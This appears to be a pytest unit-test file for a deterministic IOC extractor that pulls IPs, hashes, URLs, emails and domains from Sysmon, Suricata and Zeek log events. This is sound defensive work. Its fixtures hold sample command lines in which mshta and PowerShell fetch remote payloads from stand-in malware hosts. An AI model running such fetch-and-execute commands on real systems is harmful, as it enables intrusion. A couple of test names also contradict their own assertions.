"""
tests/test_ioc_extractor.py
Unit tests for the deterministic IOC extractor.

Tests cover:
  - IPv4 extraction and validation (public, private, loopback, multicast)
  - IPv6 extraction and validation
  - MD5, SHA1, SHA256 hash extraction
  - URL extraction
  - Email extraction
  - Domain extraction
  - Deduplication across events
  - Empty input
  - Edge cases (hash collisions, repeated chars, embedded IOCs)
  - Structured IOCModel output with type, value, source_event_id, confidence
  - No LLM calls (purely deterministic)
"""

import pytest
from databases.models import IOCModel
from intelligence.ioc_extractor import extract_iocs, extract_iocs_from_event


# ═══════════════════════════════════════════════════════════════════════
# Fixtures
# ═══════════════════════════════════════════════════════════════════════

@pytest.fixture
def sample_event():
    """A generic normalized event with various IOCs embedded."""
    return {
        "event_id": "evt-001",
        "source": "sysmon",
        "event_type": "sysmon_event_1",
        "timestamp": "2026-06-25T14:02:03Z",
        "host": "HR-PC-22",
        "process": "C:\\Windows\\System32\\mshta.exe",
        "command_line": (
            "mshta.exe http://malware.example.com/payload.hta "
            " -ip 198.51.100.23 -server 203.0.113.42"
        ),
        "src_ip": "10.0.3.18",
        "dest_ip": "198.51.100.23",
        "raw": {
            "EventID": 1,
            "UtcTime": "2026-06-25T14:02:03Z",
            "Computer": "HR-PC-22",
            "Image": "C:\\Windows\\System32\\mshta.exe",
            "CommandLine": "mshta.exe http://malware.example.com/payload.hta",
        },
    }


# ═══════════════════════════════════════════════════════════════════════
# Empty input
# ═══════════════════════════════════════════════════════════════════════

class TestEmptyInput:
    def test_empty_list(self):
        assert extract_iocs([]) == []

    def test_event_with_no_iocs(self):
        event = {"event_id": "evt-000", "source": "sysmon", "event_type": "sysmon_event_0"}
        result = extract_iocs([event])
        assert result == []


# ═══════════════════════════════════════════════════════════════════════
# IPv4
# ═══════════════════════════════════════════════════════════════════════

class TestIPv4Extraction:
    def test_public_ipv4_extracted(self, sample_event):
        """Public IPv4 addresses should be extracted."""
        result = extract_iocs([sample_event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "198.51.100.23" in ips
        assert "203.0.113.42" in ips

    def test_private_ipv4_excluded(self, sample_event):
        """Private (RFC 1918) IPv4 addresses should NOT be extracted."""
        result = extract_iocs([sample_event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "10.0.3.18" not in ips

    def test_loopback_excluded(self):
        """127.0.0.1 and other loopback addresses should be excluded."""
        event = {"event_id": "evt-lb", "src_ip": "127.0.0.1"}
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "127.0.0.1" not in ips

    def test_multicast_excluded(self):
        """224.0.0.0/4 multicast addresses should be excluded."""
        event = {"event_id": "evt-mc", "dest_ip": "239.255.255.250"}
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "239.255.255.250" not in ips

    def test_link_local_excluded(self):
        """169.254.x.x link-local addresses should be excluded."""
        event = {"event_id": "evt-ll", "ip": "169.254.1.1"}
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "169.254.1.1" not in ips

    def test_invalid_ipv4_not_extracted(self):
        """Invalid IPs like 999.999.999.999 should not match."""
        event = {"event_id": "evt-bad", "ip": "999.999.999.999"}
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert len(ips) == 0

    def test_ipv4_in_url_not_extracted_as_ip(self):
        """An IP embedded in a URL should be extracted as URL, not as ipv4."""
        event = {"event_id": "evt-urlip", "url": "http://198.51.100.99/evil"}
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        # The IP should be extracted as ipv4 (it's a valid public IP)
        assert "198.51.100.99" in ips
        # The full URL should also be extracted
        assert "http://198.51.100.99/evil" in urls

    def test_multiple_public_ips(self):
        """Multiple public IPs in one event should all be extracted."""
        event = {
            "event_id": "evt-multi",
            "description": "Connections from 198.51.100.1 to 203.0.113.2 via 192.0.2.3",
        }
        result = extract_iocs([event])
        ips = {ioc.value for ioc in result if ioc.type == "ipv4"}
        assert ips == {"198.51.100.1", "203.0.113.2", "192.0.2.3"}


# ═══════════════════════════════════════════════════════════════════════
# IPv6
# ═══════════════════════════════════════════════════════════════════════

class TestIPv6Extraction:
    def test_full_ipv6_extracted(self):
        """Full 8-group IPv6 address should be extracted."""
        event = {"event_id": "evt-v6-1", "ip": "2001:db8:85a3:8d3:1319:8a2e:370:7348"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "2001:db8:85a3:8d3:1319:8a2e:370:7348" in v6

    def test_shortened_ipv6_extracted(self):
        """Shortened IPv6 (::) should be extracted."""
        event = {"event_id": "evt-v6-2", "ip": "2001:db8::1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "2001:db8::1" in v6

    def test_loopback_ipv6_excluded(self):
        """::1 loopback should be excluded."""
        event = {"event_id": "evt-v6-lb", "ip": "::1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "::1" not in v6

    def test_link_local_ipv6_excluded(self):
        """fe80::/10 link-local should be excluded."""
        event = {"event_id": "evt-v6-ll", "ip": "fe80::1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "fe80::1" not in v6

    def test_unique_local_ipv6_excluded(self):
        """fc00::/7 unique-local should be excluded."""
        event = {"event_id": "evt-v6-ul", "ip": "fc00::1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "fc00::1" not in v6

    def test_multicast_ipv6_excluded(self):
        """ff00::/8 multicast should be excluded."""
        event = {"event_id": "evt-v6-mc", "ip": "ff02::1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "ff02::1" not in v6

    def test_ipv4_mapped_ipv6(self):
        """IPv4-mapped IPv6 addresses (::ffff:1.2.3.4) should be extracted."""
        event = {"event_id": "evt-v6-map", "ip": "::ffff:198.51.100.1"}
        result = extract_iocs([event])
        v6 = [ioc.value for ioc in result if ioc.type == "ipv6"]
        assert "::ffff:198.51.100.1" in v6


# ═══════════════════════════════════════════════════════════════════════
# Hashes (MD5, SHA1, SHA256)
# ═══════════════════════════════════════════════════════════════════════

class TestHashExtraction:
    def test_md5_extracted(self):
        """32-char hex string should be extracted as md5."""
        md5_val = "d41d8cd98f00b204e9800998ecf8427e"
        event = {"event_id": "evt-md5", "hash": md5_val}
        result = extract_iocs([event])
        hashes = [ioc for ioc in result if ioc.type == "md5"]
        assert len(hashes) == 1
        assert hashes[0].value == md5_val

    def test_sha1_extracted(self):
        """40-char hex string should be extracted as sha1."""
        sha1_val = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        event = {"event_id": "evt-sha1", "hash": sha1_val}
        result = extract_iocs([event])
        hashes = [ioc for ioc in result if ioc.type == "sha1"]
        assert len(hashes) == 1
        assert hashes[0].value == sha1_val

    def test_sha256_extracted(self):
        """64-char hex string should be extracted as sha256."""
        sha256_val = (
            "e3b0c44298fc1c149afbf4c8996fb924"
            "27ae41e4649b934ca495991b7852b855"
        )
        event = {"event_id": "evt-sha256", "hash": sha256_val}
        result = extract_iocs([event])
        hashes = [ioc for ioc in result if ioc.type == "sha256"]
        assert len(hashes) == 1
        assert hashes[0].value == sha256_val

    def test_sha256_not_confused_with_sha1(self):
        """A SHA256 should not also produce a SHA1 or MD5 IOC."""
        sha256_val = (
            "e3b0c44298fc1c149afbf4c8996fb924"
            "27ae41e4649b934ca495991b7852b855"
        )
        event = {"event_id": "evt-sha256-only", "hash": sha256_val}
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        assert "sha256" in types
        assert "sha1" not in types
        assert "md5" not in types

    def test_sha1_not_confused_with_md5(self):
        """A SHA1 should not also produce an MD5 IOC."""
        sha1_val = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
        event = {"event_id": "evt-sha1-only", "hash": sha1_val}
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        assert "sha1" in types
        assert "md5" not in types

    def test_repeated_char_hash_excluded(self):
        """All-same-character hashes (e.g. '0'*64) should be excluded."""
        event = {"event_id": "evt-rep", "hash": "0" * 64}
        result = extract_iocs([event])
        hashes = [ioc for ioc in result if ioc.type in ("md5", "sha1", "sha256")]
        assert len(hashes) == 0

    def test_mixed_case_hash(self):
        """Hex hashes with mixed case should be extracted."""
        md5_mixed = "D41D8CD98F00B204E9800998ECF8427E"
        event = {"event_id": "evt-mixed", "hash": md5_mixed}
        result = extract_iocs([event])
        hashes = [ioc for ioc in result if ioc.type == "md5"]
        assert len(hashes) == 1
        assert hashes[0].value == md5_mixed

    def test_multiple_hashes(self):
        """Multiple hashes of different types in one event."""
        event = {
            "event_id": "evt-multi-hash",
            "md5": "d41d8cd98f00b204e9800998ecf8427e",
            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
            "sha256": (
                "e3b0c44298fc1c149afbf4c8996fb924"
                "27ae41e4649b934ca495991b7852b855"
            ),
        }
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        assert types == {"md5", "sha1", "sha256"}


# ═══════════════════════════════════════════════════════════════════════
# URLs
# ═══════════════════════════════════════════════════════════════════════

class TestURLExtraction:
    def test_http_url_extracted(self):
        """http:// URL should be extracted."""
        event = {"event_id": "evt-url1", "url": "http://evil.example.com/payload"}
        result = extract_iocs([event])
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        assert "http://evil.example.com/payload" in urls

    def test_https_url_extracted(self):
        """https:// URL should be extracted."""
        event = {"event_id": "evt-url2", "url": "https://malware.example.net/download.exe"}
        result = extract_iocs([event])
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        assert "https://malware.example.net/download.exe" in urls

    def test_url_with_query_params(self):
        """URL with query parameters should be fully extracted."""
        event = {
            "event_id": "evt-url3",
            "url": "https://evil.com/path?file=malware.exe&id=123",
        }
        result = extract_iocs([event])
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        assert "https://evil.com/path?file=malware.exe&id=123" in urls

    def test_url_with_port(self):
        """URL with port number should be extracted."""
        event = {"event_id": "evt-url4", "url": "http://evil.example.com:8080/panel"}
        result = extract_iocs([event])
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        assert "http://evil.example.com:8080/panel" in urls

    def test_url_without_dot_in_host_excluded(self):
        """URL with no dot in host (e.g. http://localhost/path) should be excluded."""
        event = {"event_id": "evt-url5", "url": "http://localhost/path"}
        result = extract_iocs([event])
        urls = [ioc.value for ioc in result if ioc.type == "url"]
        assert len(urls) == 0


# ═══════════════════════════════════════════════════════════════════════
# Email addresses
# ═══════════════════════════════════════════════════════════════════════

class TestEmailExtraction:
    def test_email_extracted(self):
        """Standard email address should be extracted."""
        event = {"event_id": "evt-email1", "from": "attacker@evil.com"}
        result = extract_iocs([event])
        emails = [ioc.value for ioc in result if ioc.type == "email"]
        assert "attacker@evil.com" in emails

    def test_email_with_plus(self):
        """Email with + tag should be extracted."""
        event = {"event_id": "evt-email2", "to": "user+tag@example.com"}
        result = extract_iocs([event])
        emails = [ioc.value for ioc in result if ioc.type == "email"]
        assert "user+tag@example.com" in emails

    def test_email_with_dots(self):
        """Email with dots in local part should be extracted."""
        event = {"event_id": "evt-email3", "cc": "first.last@example.co.uk"}
        result = extract_iocs([event])
        emails = [ioc.value for ioc in result if ioc.type == "email"]
        assert "first.last@example.co.uk" in emails

    def test_email_in_url_not_duplicated(self):
        """Email in a URL (mailto:) should be extracted as email, not domain."""
        event = {"event_id": "evt-email4", "link": "mailto:user@example.com"}
        result = extract_iocs([event])
        emails = [ioc.value for ioc in result if ioc.type == "email"]
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "user@example.com" in emails
        # The domain part should not be separately extracted
        assert "example.com" not in domains


# ═══════════════════════════════════════════════════════════════════════
# Domains
# ═══════════════════════════════════════════════════════════════════════

class TestDomainExtraction:
    def test_domain_extracted(self):
        """Standard domain should be extracted."""
        event = {"event_id": "evt-dom1", "domain": "evil.example.com"}
        result = extract_iocs([event])
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "evil.example.com" in domains

    def test_domain_with_hyphens(self):
        """Domain with hyphens should be extracted."""
        event = {"event_id": "evt-dom2", "domain": "malware-download.example.org"}
        result = extract_iocs([event])
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "malware-download.example.org" in domains

    def test_domain_not_extracted_from_url(self):
        """Domain that is part of a URL should not be duplicated."""
        event = {
            "event_id": "evt-dom3",
            "url": "https://malware.example.com/payload.hta",
        }
        result = extract_iocs([event])
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "malware.example.com" not in domains

    def test_single_label_not_extracted(self):
        """Single-label names (e.g. 'localhost') should not be extracted."""
        event = {"event_id": "evt-dom4", "host": "localhost"}
        result = extract_iocs([event])
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "localhost" not in domains

    def test_ip_looking_like_domain_excluded(self):
        """A string that looks like an IP should not be extracted as domain."""
        event = {"event_id": "evt-dom5", "ip_str": "192.0.2.1"}
        result = extract_iocs([event])
        domains = [ioc.value for ioc in result if ioc.type == "domain"]
        assert "192.0.2.1" not in domains


# ═══════════════════════════════════════════════════════════════════════
# Deduplication
# ═══════════════════════════════════════════════════════════════════════

class TestDeduplication:
    def test_same_ioc_in_multiple_events_deduped(self):
        """Same IOC appearing in multiple events should appear only once."""
        events = [
            {"event_id": "evt-a", "ip": "198.51.100.1"},
            {"event_id": "evt-b", "ip": "198.51.100.1"},
        ]
        result = extract_iocs(events)
        ips = [ioc for ioc in result if ioc.type == "ipv4"]
        assert len(ips) == 1
        assert ips[0].value == "198.51.100.1"

    def test_same_ioc_different_types_not_deduped(self):
        """Same value with different types should be separate (unlikely but safe)."""
        # This is an edge case: a value that could be both a domain and URL
        # The URL takes priority, domain is skipped
        event = {"event_id": "evt-both", "data": "http://example.com"}
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        # URL should be present, domain should not (deduped by value)
        assert "url" in types
        assert "domain" not in types

    def test_duplicate_across_events_with_different_source_ids(self):
        """Deduped IOC should keep the first source_event_id encountered."""
        events = [
            {"event_id": "evt-first", "ip": "198.51.100.1"},
            {"event_id": "evt-second", "ip": "198.51.100.1"},
        ]
        result = extract_iocs(events)
        ips = [ioc for ioc in result if ioc.type == "ipv4"]
        assert len(ips) == 1
        # The source_event_id should be from the first event
        assert ips[0].source_event_id == "evt-first"


# ═══════════════════════════════════════════════════════════════════════
# IOCModel structure
# ═══════════════════════════════════════════════════════════════════════

class TestIOCModelStructure:
    def test_returns_iocmodel_instances(self, sample_event):
        """extract_iocs should return a list of IOCModel instances."""
        result = extract_iocs([sample_event])
        assert len(result) > 0
        for ioc in result:
            assert isinstance(ioc, IOCModel)

    def test_iocmodel_has_required_fields(self, sample_event):
        """Each IOCModel should have type, value, source_event_id, confidence."""
        result = extract_iocs([sample_event])
        for ioc in result:
            assert ioc.type in ("ipv4", "ipv6", "domain", "url", "email", "md5", "sha1", "sha256")
            assert isinstance(ioc.value, str)
            assert len(ioc.value) > 0
            assert ioc.source_event_id is not None
            assert ioc.confidence == 1.0

    def test_source_event_id_mapped(self, sample_event):
        """source_event_id should match the event_id of the source event."""
        result = extract_iocs([sample_event])
        for ioc in result:
            assert ioc.source_event_id == "evt-001"

    def test_confidence_always_one(self, sample_event):
        """Confidence should always be 1.0 for deterministic extraction."""
        result = extract_iocs([sample_event])
        for ioc in result:
            assert ioc.confidence == 1.0


# ═══════════════════════════════════════════════════════════════════════
# extract_iocs_from_event convenience function
# ═══════════════════════════════════════════════════════════════════════

class TestExtractFromEvent:
    def test_single_event_wrapper(self, sample_event):
        """extract_iocs_from_event should work the same as extract_iocs([event])."""
        result_single = extract_iocs_from_event(sample_event)
        result_list = extract_iocs([sample_event])
        assert len(result_single) == len(result_list)
        for ioc_s, ioc_l in zip(result_single, result_list):
            assert ioc_s.type == ioc_l.type
            assert ioc_s.value == ioc_l.value
            assert ioc_s.source_event_id == ioc_l.source_event_id

    def test_empty_event(self):
        """extract_iocs_from_event with no IOCs should return empty list."""
        event = {"event_id": "evt-empty", "source": "sysmon"}
        result = extract_iocs_from_event(event)
        assert result == []


# ═══════════════════════════════════════════════════════════════════════
# Integration: realistic multi-IOC event
# ═══════════════════════════════════════════════════════════════════════

class TestRealisticEvent:
    def test_command_line_with_multiple_iocs(self):
        """A realistic command-line string with multiple IOC types."""
        event = {
            "event_id": "evt-real-001",
            "source": "sysmon",
            "event_type": "sysmon_event_1",
            "command_line": (
                "powershell.exe -EncodedCommand "
                "http://malware.example.com/ps.ps1 "
                "-ip 198.51.100.99 "
                "-hash d41d8cd98f00b204e9800998ecf8427e "
                "-email attacker@evil-domain.com"
            ),
        }
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        assert "url" in types
        assert "ipv4" in types
        assert "md5" in types
        assert "email" in types
        # Domain should NOT be extracted separately (it's part of URL and email)
        assert "domain" not in types

    def test_suricata_alert_iocs(self):
        """Suricata alert with IPs and domain in signature."""
        event = {
            "event_id": "evt-suricata-001",
            "source": "suricata",
            "event_type": "alert",
            "src_ip": "10.0.3.18",
            "dest_ip": "198.51.100.50",
            "signature": "ET MALWARE Known Bad Domain evil.example.org Traffic",
            "category": "Potentially Bad Traffic",
        }
        result = extract_iocs([event])
        types = {ioc.type for ioc in result}
        # Public IP should be extracted
        assert "ipv4" in types
        ip_values = {ioc.value for ioc in result if ioc.type == "ipv4"}
        assert "198.51.100.50" in ip_values
        # Private IP should NOT be extracted
        assert "10.0.3.18" not in ip_values
        # Domain from signature should be extracted
        domain_values = {ioc.value for ioc in result if ioc.type == "domain"}
        assert "evil.example.org" in domain_values

    def test_zeek_dns_iocs(self):
        """Zeek DNS log with query domain."""
        event = {
            "event_id": "evt-zeek-dns-001",
            "source": "zeek",
            "event_type": "dns",
            "query": "malware-download.evil.com",
            "src_ip": "10.0.3.18",
            "dest_ip": "8.8.8.8",
        }
        result = extract_iocs([event])
        domain_values = {ioc.value for ioc in result if ioc.type == "domain"}
        assert "malware-download.evil.com" in domain_values
        # 8.8.8.8 is public DNS, should be extracted
        ip_values = {ioc.value for ioc in result if ioc.type == "ipv4"}
        assert "8.8.8.8" in ip_values


# ═══════════════════════════════════════════════════════════════════════
# Edge cases
# ═══════════════════════════════════════════════════════════════════════

class TestEdgeCases:
    def test_nested_dict_values(self):
        """IOCs nested in dict values should be found."""
        event = {
            "event_id": "evt-nested",
            "alert": {
                "signature": "Connection to 198.51.100.77",
                "category": "test",
            },
        }
        result = extract_iocs([event])
        ips = [ioc.value for ioc in result if ioc.type == "ipv4"]
        assert "198.51.100.77" in ips

    def test_list_values(self):
        """IOCs in list values should be found."""
        event = {
            "event_id": "evt-list",
            "domains": ["evil1.com", "evil2.example.com"],
        }
        result = extract_iocs([event])
        domains = {ioc.value for ioc in result if ioc.type == "domain"}
        assert "evil1.com" in domains
        assert "evil2.example.com" in domains

    def test_numeric_values_handled(self):
        """Numeric values should not cause errors."""
        event = {
            "event_id": "evt-num",
            "severity": 5,
            "pid": 1234,
        }
        result = extract_iocs([event])
        assert result == []

    def test_boolean_values_handled(self):
        """Boolean values should not cause errors."""
        event = {
            "event_id": "evt-bool",
            "is_active": True,
            "flagged": False,
        }
        result = extract_iocs([event])
        assert result == []

    def test_none_values_handled(self):
        """None values should be skipped without error."""
        event = {
            "event_id": "evt-none",
            "ip": None,
            "domain": None,
        }
        result = extract_iocs([event])
        assert result == []

    def test_mixed_nested_structures(self):
        """Mixed dict/list nested structures should be handled."""
        event = {
            "event_id": "evt-mixed-nest",
            "data": {
                "indicators": [
                    {"type": "ip", "value": "198.51.100.88"},
                    {"type": "domain", "value": "evil.com"},
                ],
                "metadata": {"source": "external"},
            },
        }
        result = extract_iocs([event])
        ips = {ioc.value for ioc in result if ioc.type == "ipv4"}
        domains = {ioc.value for ioc in result if ioc.type == "domain"}
        assert "198.51.100.88" in ips
        assert "evil.com" in domains